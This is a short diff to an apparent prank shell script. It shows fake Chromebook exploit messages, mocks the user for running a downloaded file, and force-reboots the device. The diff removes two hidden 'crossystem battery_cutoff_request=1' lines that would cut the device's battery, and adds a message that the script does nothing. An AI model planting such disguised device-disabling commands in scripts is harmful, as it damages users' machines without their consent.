@@ -3,8 +3,7 @@
 echo "Sourcing exploit files..."
 sleep 1
 echo "Starting bootwrite..."
-crossystem battery_cutoff_request=1 >/dev/null 2>&1 || :
-crossystem battery_cutoff_request=1 >/dev/null 2>&1 || :
+sleep 1
 echo "Think about what you just did."
 sleep 2
 echo "You downloaded a random file from the internet which now has full root access to your chromebook"
@@ -16,5 +15,6 @@ sleep 4
 echo ""
 echo "lol"
 sleep 2
+echo "you're real lucky this doesnt do anything"
+sleep 1
 reboot -f
-tail -f /dev/null
